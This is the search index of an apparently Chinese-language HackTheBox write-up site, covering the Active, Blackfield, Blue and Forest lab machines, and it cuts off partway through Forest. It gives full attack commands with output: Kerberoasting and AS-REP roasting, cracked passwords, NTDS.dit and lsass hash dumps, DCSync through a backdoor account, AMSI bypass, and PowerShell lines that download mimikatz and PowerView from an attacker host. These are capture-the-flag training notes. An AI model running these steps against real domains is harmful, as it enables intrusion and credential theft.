{"config": {"lang": ["en"], "separator": "[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+", "pipeline": ["stemmer"]}, "docs": [{"location": "", "title": "Home", "text": "<p>\u770b\u4e0d\u60ef\u522b\u4eba\u7684 Write-up\uff0c\u90a3\u5c31\u53ea\u597d\u81ea\u5df1\u5199\u4e86~</p> <ul> <li> <p> Hackthebox</p> </li> <li> <p> Tryhackme</p> </li> </ul>"}, {"location": "HackTheBox/", "title": "Index", "text": "<ul> <li>HackTheBox<ul> <li>Machines</li> <li>Challenges<ul> <li>Misc</li> <li>Web</li> <li>Crypto</li> <li>Reverse</li> <li>Pwn</li> </ul> </li> <li>Sherlocks</li> </ul> </li> </ul>"}, {"location": "HackTheBox/Machines/Active/", "title": "Active", "text": ""}, {"location": "HackTheBox/Machines/Active/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.100 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-11 13:22:10Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5722/tcp  open  msrpc         Microsoft Windows RPC\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49152/tcp open  msrpc         Microsoft Windows RPC\n49153/tcp open  msrpc         Microsoft Windows RPC\n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         Microsoft Windows RPC\n49165/tcp open  msrpc         Microsoft Windows RPC\n49170/tcp open  msrpc         Microsoft Windows RPC\n49171/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 (95%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 R2 (94%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (93%), Microsoft Windows Server 2008 SP1 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-01-11T13:23:21\n|_  start_date: 2024-01-11T00:12:28\n|_clock-skew: -23s\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled and required\n</code></pre> - <code>ldapsearch</code> <pre><code>ldapsearch -H \"ldap://$IP\" -x -s base namingcontexts\n---\ndn:\nnamingContexts: DC=active,DC=htb\nnamingContexts: CN=Configuration,DC=active,DC=htb\nnamingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb\nnamingContexts: DC=DomainDnsZones,DC=active,DC=htb\nnamingContexts: DC=ForestDnsZones,DC=active,DC=htb\n\nldapsearch -H \"ldap://$IP\" -x -b \"DC=active,DC=htb\"\n---\nNull\n</code></pre> - enum4linux  \u53d1\u73b0\u90e8\u5206 SMB Shares - <code>smbclient //10.10.10.100/Replication</code>  \u53d1\u73b0\u4e864\u4e2a\u6587\u4ef6\uff0c\u5e76\u5728\u5176\u4e2d\u53d1\u73b0\u4e86\u8d26\u6237 <code>active.htb\\SVC_TGS</code> \u548c\u88ab\u52a0\u5bc6\u7684\u5bc6\u7801\uff1a <code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p>"}, {"location": "HackTheBox/Machines/Active/#shell-as-user-svc_tgs", "title": "Shell as User - SVC_TGS", "text": "<p> \u662f AES-256 \u52a0\u5bc6\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>gpp-decrypt</code> \u89e3\u5bc6  <code>active.htb/SVC_TGS:GPPstillStandingStrong2k18</code> - \u7ee7\u7eed\u679a\u4e3e Samba Shares <pre><code>crackmapexec smb $IP -u SVC_TGS -p 'GPPstillStandingStrong2k18' --shares\n---\nSMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)\nSMB         10.10.10.100    445    DC               [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18 \nSMB         10.10.10.100    445    DC               [+] Enumerated shares\nSMB         10.10.10.100    445    DC               Share           Permissions     Remark\nSMB         10.10.10.100    445    DC               -----           -----------     ------\nSMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin\nSMB         10.10.10.100    445    DC               C$                              Default share\nSMB         10.10.10.100    445    DC               IPC$                            Remote IPC\nSMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share \nSMB         10.10.10.100    445    DC               Replication     READ            \nSMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share \nSMB         10.10.10.100    445    DC               Users           READ\n</code></pre> - \u627e\u5230 Users \u76ee\u5f55  - \u905b\u72d7  \u4f46\u662f\u6ca1 shell\uff0c\u64cd\u4f5c\u4e0d\u4e86</p>"}, {"location": "HackTheBox/Machines/Active/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li>\u67e5\u770b\u8bbe\u7f6e\u4e86 SPN \u7684\u8d26\u6237\uff0c\u53d1\u73b0 administrator <pre><code>impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip $IP -dc-host DC.active.htb\n</code></pre> </li> <li>\u5c1d\u8bd5 Kerberoasting \u83b7\u53d6\u670d\u52a1 Hash <pre><code>impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip $IP -dc-host DC.active.htb -request\n</code></pre> </li> <li>\u7206\u7834 Hash <pre><code>hashcat -m 13100 hash.list /usr/share/wordlists/rockyou.txt\n---\n$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ab13391da2a1d4d8992ba3d12d3927ef$26a5ea21be878ceff5464e9c76c032fac700d4ec0b10566a55fdefbf7c629fa1c63e2b6c10a34e6517e704b3cd9909493a6944f60416772d662d7284c2d5733cc3fa0fda0819dcda9f581e7a3d5fad7227966886ee1349e01c297c1e3656e02a1d790ec71161c80d5d4143d84975fa67512ab2f17acd0d4a2104744d4c576d7e207460ddd6a9f754123176ea901f33c0b3f58e64658c81b81df8f996f44b764e7970ae9d265032925db343bfac983471b6b8690319e8d8c8cfa2709ff2e19b458a20d5524ca25dbefd49ebf24625ffcc8707e2d0578e418fba6ab474c428f26c853126f8901a733540577a7f739f425ee1683b51b5b32de021b2facbc1f04292d8a5bb35c03c7541f6d95cc939ddc198612d88ef9df6d20e20651d2cc48b10edfc3ec470ddd7488b42ffeb92b0bc733c5120273b0a600fee4cda1777042d88b5376ea32176dfbb405165824fdcb5715db92521599469a137c41fffe5e079985a7646ea6859b4c5a656bc8ef4c6aea250f8eafcc080e4a039146e474dab7f18221d518ae85381596aefc231b72df63e92935c483addbc4b2e6cb49be7162526cc30cc78bbe6e638115188ccee8a20d3d10fe3e5604567d6908d92ab09054ab8c46172438dc964c7075749bf4a94122e7dc6bd0cd2dd737c194fbc671d087a36fcd84d1f500377970246036e8deab3712977d8615deb600f38a27253a908d9544b9dff17a7dbdd36e5c70c6b2a99814f822c6b74d1a3646f88ce93a391f3e384ac81fe142dce20bf2273e457d74c7184ff1e0799473139ea7e1dd18c293819b922a66b8d5b0872f352cba575cee04fda5ee9f834c470051aa6e4d083411a092923d23334f13550437cbd92fd6da6d5cd322fa321c379e89535685110027522852e7e1ee79350ced72ec807cab49afd0c8b8c9c607f665c43d318f4a22135f20a33da060aa5ee8914d5e59c143bfe64e3f95c2497ea613e7d7eb42650709bc77feb4e66fc26cde267c5332a1d015ec0095d3eacf1ce016778db78df448e22a113bbe11f151cce087c2dff879de0a6b305caf0bcb3f36b63e97a7b4079972395c472c6ae3bd4b72b6f6efae046a69dcf6bc5cd370d366c4f89ee0dc41d0aa95231a994764e2d45e61a5720d20cec8b5fe12548527143b187b4eda59cc94ec2729d29ea0424dce5a2c8f459fe23f3957a6bd4f08883932867fdf8f29b2b805f9a769f479f2a1f7d2029aeea8fa44c891bf6089947580f2a707747bf7f:Ticketmaster1968\n</code></pre></li> <li><code>Administrator:Ticketmaster1968</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Active/#dump-hash", "title": "Dump Hash", "text": "<pre><code>powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.16.18/mimikatz.exe','C:\\Windows\\Temp\\mimikatz.exe')\nC:\\Windows\\Temp\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::dcsync /domain:active.htb /all /csv\" exit\n--- Local\nAdministrator:5c15eb37006fb74c21a5d1e2144b726e\n--- Domain\n502     krbtgt          b889e0d47d6fe22c8f0463a717f460dc        514\n500     Administrator   5ffb4aaaf9b63dc519eca04aec0e8bed        66048\n1000    DC$             ad785e2162b240a84dc409c0a4555b0a        532480\n1103    SVC_TGS         f54f3a1d3c38140684ff4dad029f25b5        66048\n</code></pre>"}, {"location": "HackTheBox/Machines/Blackfield/", "title": "Blackfield", "text": ""}, {"location": "HackTheBox/Machines/Blackfield/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.192 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-12 10:45:02Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49676/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019 (89%)\nAggressive OS guesses: Microsoft Windows Server 2019 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: 7h59m59s\n| smb2-time: \n|   date: 2024-01-12T10:46:11\n|_  start_date: N/A\n</code></pre> - <code>crackmapexec smb $IP -u guest -p '' --shares</code>  \u6ca1\u6709\u7ffb\u5230\u4ec0\u4e48\u53ef\u7528\u7684\u6587\u4ef6\u4fe1\u606f - <code>crackmapexec smb $IP -u guest -p '' --rid-brute 10000</code>  - \u7206\u51fa\u7684\u7528\u6237 <pre><code>Administrator\nDC01$ \nDnsAdmins \nDnsUpdateProxy \nGuest \nPC01$\nSRV-EXCHANGE$ \nSRV-FILE$ \nSRV-INTRANET$ \nSRV-WEB$  \naudit2020 \nkrbtgt \nlydericlefebvre \nsupport \nsvc_backup\n</code></pre>     - AS-REP Roasting \u5f97\u5230 <code>support@BLACKFIELD.LOCAL</code> Hash  - <code>ldapsearch -x -H \"ldap://$IP\" -s base namingContexts</code>  - <code>ldapsearch -x -H \"ldap://$IP\" -b \"DC=BLACKFIELD,DC=local\"</code> </p>"}, {"location": "HackTheBox/Machines/Blackfield/#shell-as-user-support", "title": "Shell as User - support", "text": "<ul> <li>\u7206\u7834 Hash <code>hashcat -m 18200 hash.list /usr/share/wordlists/rockyou.txt</code> </li> <li>\u5c1d\u8bd5\u767b\u5f55\u7528\u6237 <code>support:#00^BlackKnight</code>  \u63d0\u793a\u8ba4\u8bc1\u5931\u8d25</li> <li>\u67e5\u770b\u7528\u6237 samba \u6743\u9650  \u76ee\u5f55\u53ef\u8bfb\uff0c\u4f46\u662f\u6ca1\u4ec0\u4e48\u4e1c\u897f</li> </ul>"}, {"location": "HackTheBox/Machines/Blackfield/#shell-as-user-audit2020", "title": "Shell as User - AUDIT2020", "text": "<ul> <li>\u905b\u72d7\uff0c\u53d1\u73b0\u53ef\u4ee5\u91cd\u7f6e\u5bc6\u7801  <p>https://www.thehacker.recipes/a-d/movement/dacl/forcechangepassword</p> </li> </ul> <p>  - bloodhound \u770b\u5230\u6ca1\u6709\u8fdc\u7a0b\u7ba1\u7406\u7684\u6743\u9650\uff0c\u53d1\u73b0\u65b0\u7684 samba \u76ee\u5f55  - <code>smbclient -U BLACKFIELD.local/AUDIT2020 //10.10.10.192/forensic</code> </p>"}, {"location": "HackTheBox/Machines/Blackfield/#shell-as-user-svc_backup", "title": "Shell as User - svc_backup", "text": "<p>\u53d1\u73b0\u5185\u5b58 lsass \u76f8\u5173\u6587\u4ef6\uff0c\u5c1d\u8bd5 <code>pypykatz lsa minidump lsass.DMP</code> <pre><code>svc_backup:9658d1d1dcd9250115e2205d9f48400d\nadministrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62\n</code></pre> - \u7ecf\u8fc7\u5c1d\u8bd5 svc_backup \u53ef\u4ee5\u767b\u5f55  - \u62e5\u6709\u5907\u4efd\u6743\u9650\uff0c\u76f4\u63a5\u5907\u4efd <pre><code>reg save hklm\\system system.bak\nreg save hklm\\sam sam.bak\ndownload system.bak\ndownload sam.bak\n</code></pre></p> <p>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#a-d-attack - \u57df\u73af\u5883\u53ef\u4ee5\u4f7f\u7528 wbadmin.exe.exe \u6765 dump NTDS.dit  \u770b\u5230 svc_backup \u8d26\u6237\u53ef\u4ee5\u5199\u5165 samba/C$ <pre><code># \u521b\u5efa\u76ee\u5f55\u6302\u8f7d\u5230 V \u76d8\nnet use V: \\\\10.10.10.192\\C$\\temp2 /user:smbuser password\n# \u6d4b\u8bd5\necho test &gt; c:\\temp2\\test.txt\ndir v:\\\n\necho \"Y\" | wbadmin start backup -backuptarget:\\\\10.10.10.192\\C$\\temp2 -include:c:\\windows\\ntds\nwbadmin get versions\n# \u66f4\u6362\u4e0a\u9762\u770b\u5230\u7684\u7248\u672c\u65f6\u95f4\necho \"Y\" | wbadmin start recovery -version:01/12/2024-15:26 -itemtype:file -items:c:\\windows\\ntds\\ntds.dit -recoverytarget:C:\\temp2 -notrestoreacl\n</code></pre> \u64cd\u4f5c\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u5728 C:\\temp2 \u770b\u5230 ntds.dit  <code>impacket-secretsdump -sam sam.bak -system system.bak -ntds ntds.dit local</code>  - <code>evil-winrm -i 10.10.10.192 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'</code> </p>"}, {"location": "HackTheBox/Machines/Blackfield/#hash-dump", "title": "Hash dump", "text": "<pre><code>impacket-secretsdump -sam sam.bak -system system.bak -ntds ntds.dit local\n---\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c\n[*] Reading and decrypting hashes from ntds.dit\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDC01$:1000:aad3b435b51404eeaad3b435b51404ee:8dc97ba2120794582ea63a4c790da901:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::\naudit2020:1103:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::\nsupport:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::\n</code></pre>"}, {"location": "HackTheBox/Machines/Blue/", "title": "Blue", "text": ""}, {"location": "HackTheBox/Machines/Blue/#recon", "title": "Recon", "text": "<p>export IP=10.10.10.40 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT      STATE SERVICE      VERSION\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\n49156/tcp open  msrpc        Microsoft Windows RPC\n49157/tcp open  msrpc        Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows Vista or Windows 7 SP1 (96%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (96%), Microsoft Windows Vista SP2, Windows 7, or Windows 7 SP1 (96%), Microsoft Windows Vista SP0 or SP1 (96%), Microsoft Windows 7 Enterprise SP1 (96%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: haris-PC\n|   NetBIOS computer name: HARIS-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2024-01-09T08:07:44+00:00\n|_clock-skew: mean: 3s, deviation: 2s, median: 1s\n| smb2-time: \n|   date: 2024-01-09T08:07:43\n|_  start_date: 2024-01-09T03:24:10\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled but not required\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Blue/#shell-as-root", "title": "Shell as Root", "text": "<p>Windows 7 + \u9898\u76ee\u7684 Blue = MS17-010 </p>"}, {"location": "HackTheBox/Machines/Blue/#hash-dump", "title": "Hash Dump", "text": "<pre><code>meterpreter &gt; hashdump\n---\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nharis:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::\n</code></pre>"}, {"location": "HackTheBox/Machines/Forest/", "title": "Forest", "text": ""}, {"location": "HackTheBox/Machines/Forest/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.161 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT      STATE SERVICE      VERSION\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-10 07:52:25Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf       .NET Message Framing\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49667/tcp open  msrpc        Microsoft Windows RPC\n49671/tcp open  msrpc        Microsoft Windows RPC\n49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49677/tcp open  msrpc        Microsoft Windows RPC\n49682/tcp open  msrpc        Microsoft Windows RPC\n49704/tcp open  msrpc        Microsoft Windows RPC\n49942/tcp open  msrpc        Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2016 (95%), Microsoft Windows Server 2016 build 10586 - 14393 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 or Server 2012 R2 (91%), Microsoft Windows 10 (91%), Microsoft Windows 10 1507 (91%), Microsoft Windows 10 1507 - 1607 (91%), Microsoft Windows 10 1511 (91%), Microsoft Windows Server 2012 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 2h46m49s, deviation: 4h37m10s, median: 6m48s\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-01-10T07:53:39\n|_  start_date: 2024-01-10T04:01:02\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: FOREST\n|   NetBIOS computer name: FOREST\\x00\n|   Domain name: htb.local\n|   Forest name: htb.local\n|   FQDN: FOREST.htb.local\n|_  System time: 2024-01-09T23:53:38-08:00\n</code></pre> - <code>crackmapexec</code> <pre><code>export DOAMIN=htb.local\ncrackmapexec smb $IP -d $DOMAIN -u guest -p '' --shares\ncrackmapexec smb $IP -d $DOMAIN --rid-brute 10000\n---\nNull\n</code></pre> - <code>ldapsearch</code> <pre><code>$ ldapsearch -H \"ldap://$IP\" -x -s base namingcontexts\n---\nnamingContexts: DC=htb,DC=local\n...\n\n$ ldapsearch -H \"ldap://$IP\" -x -b \"DC=htb,DC=local\" &gt; ldap_htb_local.txt\n$ cat ldap_htb_local.txt | grep userPrincipalName\n---\n... # \u7528\u6237\u8d26\u6237\nuserPrincipalName: sebastien@htb.local\nuserPrincipalName: santi@htb.local\nuserPrincipalName: lucinda@htb.local\nuserPrincipalName: andy@htb.local\nuserPrincipalName: mark@htb.local\n\n$ cat ldap_htb_local.txt | grep 'OU=Service Accounts'\n---\n... # \u670d\u52a1\u8d26\u6237\ndn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local\n</code></pre> - \u670d\u52a1\u8d26\u6237\u53ef\u80fd\u4f1a\u7981\u7528 Kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\uff0c\u56e0\u6b64\u5c1d\u8bd5 ASREP-Roasting <pre><code>impacket-GetNPUsers htb.local/svc-alfresco -dc-ip $IP -no-pass -format hashcat -outputfile hash.list\n---\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Getting TGT for svc-alfresco\n$krb5asrep$23$svc-alfresco@HTB.LOCAL:c1f9ba755560726f8ea905a4f55b32d9$5cdd71e39c6eea984b166ab7e82fa0b1a4fb93124196e6cd6923512cb97be1e8360053e8660821f0cbf108eb64d0cbc6293258abf857fcf62626bcd776787826148ee6630db3fc702d994b5fbdf1c175e4d397b0827274858c6068b3b5d1fb83333493a17082e52a357b9451b4f2d8bd7340a0339c36af2a942e626ec77dd1ef74ced153a70b83f4d66fbc52709dfa6efa7e5d4b15fb0b78271c28cc18cb0ec461629009b5d3d5abbdb77cc5598ac80613976f60cbcc4029bf8732d47347dfa3806dc3a1adf93575f72136994950d42ce3658f53aa56d8cd8ea0b07882b122b99ddd1600fe42\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Forest/#shell-as-user-svc-alfresco", "title": "Shell as User - svc-alfresco", "text": "<ul> <li>\u7206\u7834\u52a0\u5bc6\u7684 TGT <pre><code>john hash.list --wordlist=/usr/share/wordlists/rockyou.txt\n---\n    s3rvice          (krb5asrep$23$svc-alfresco@HTB.LOCAL)\n</code></pre></li> <li><code>evil-winrm -i $IP -u svc-alfresco -p s3rvice</code> </li> <li>\u770b\u5230\u4e3b\u57df\u662f <code>FOREST.htb.local</code> \u5f00\u59cb\u905b\u72d7 <pre><code>bloodhound-python -d htb.local -ns 10.10.10.161 -c all -u 'svc-alfresco' -p 's3rvice'\n# \u8fd9\u91cc\u9776\u673a\u597d\u50cf DNS \u6709\u70b9\u95ee\u9898\uff0c\u6362\u6210 exe \u905b\u72d7\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop&gt; Bypass-4MSI\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop&gt; ./SharpHound.exe --CollectionMethods All\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop&gt; download \n</code></pre></li> </ul>"}, {"location": "HackTheBox/Machines/Forest/#shell-as-user-newboy", "title": "Shell as User - newboy", "text": "<ul> <li>\u6807\u8bb0\u5df2\u6709\u8d26\u53f7\u4e3a Owned\uff0c\u641c\u7d22\u5230\u8fbe HTB.LOCAL \u7684\u8def\u5f84 </li> <li><code>svc-alfresco</code> \u5c5e\u4e8e <code>Account Operators</code> \u7ec4\uff0c</li> <li><code>Exchange Windows Permissions</code> \u7ec4\u6709 <code>WriteDacl</code> \u6743\u9650\u4e14\u4e0d\u53d7\u4fdd\u62a4 \u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7 <code>svc-alfresco</code> \u7528\u6237\u521b\u5efa\u65b0\u7528\u6237\uff0c\u5e76\u5c06\u5176\u6dfb\u52a0\u5230 <code>Exchange Windows Permissions</code> \u7ec4\uff0c\u7136\u540e\u5229\u7528 <code>Exchange Windows Permissions</code> \u7ec4\u7684 <code>WriteDacl</code> \u6743\u9650\u4fee\u6539\u7528\u6237 <code>ACEs</code> \uff0c\u8d4b\u4e88 DCSync \u6743\u9650\uff0cDump Hash</li> <li>\u6dfb\u52a0\u65b0\u7528\u6237 newboy\uff0c\u6dfb\u52a0\u5230\u6240\u9700\u7528\u6237\u7ec4 <pre><code>net user newboy Admin@123 /add /domain\nnet group \"Exchange Windows Permissions\" newboy /add\nnet localgroup \"Remote Management Users\" newboy /add\n</code></pre></li> <li>\u767b\u5f55 newboy \u7528\u6237 <code>evil-winrm -i $IP -u 'newboy' -p 'Admin@123' -s .</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Forest/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li>newboy \u7528\u6237\u8d4b\u4e88\u81ea\u5df1 DCSync \u6743\u9650 <pre><code>[*Evil-WinRM* PS C:\\&gt; ]\nBypass-4MSI\nIEX(New-Object Net.WebClient).DownloadString(\"http://10.10.16.18/PowerView.ps1\")\n# \u6dfb\u52a0 DCSync \u6743\u9650\nAdd-ObjectAcl -TargetIdentity \"DC=htb,DC=local\" -PrincipalIdentity newboy -Rights DCSync -Verbose\n\n# \u5220\u9664 DCSync \u6743\u9650\nRemove-DomainObjectAcl -TargetIdentity \"DC=htb,DC=local\" -PrincipalIdentity newboy -Rights DCSync -Verbose\n</code></pre></li> <li>\u4e5f\u53ef\u4ee5\u5728 <code>svc-alfresco</code> 